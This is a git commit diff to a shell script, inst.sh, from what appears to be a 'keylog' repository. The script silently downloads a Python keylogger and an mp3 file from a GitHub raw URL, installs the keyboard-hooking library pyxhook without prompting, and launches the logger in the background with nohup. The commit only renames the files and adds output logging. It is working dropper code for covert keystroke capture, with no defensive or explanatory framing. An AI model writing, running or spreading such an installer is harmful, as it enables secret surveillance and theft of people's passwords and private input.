0665484ce7dcefb3a47cf3ceb62a92c0252148d1
khaynie <76216676+k-haynie@users.noreply.github.com>
2025-11-17 02:50:03 +0000

    Update script to download and run keylog files

--- inst.sh
+++ inst.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.log.py"
-wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/.music.mp3"
+wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/KEYLOG_log.py"
+wget -q -nc "https://raw.githubusercontent.com/k-haynie/keylog/main/KEYLOG_music.mp3"
 yes | pip3 install pyxhook pygame 
-nohup python3 .log.py &
+nohup python3 KEYLOG_log.py > KEYLOG_script_out.log 2>&1 &
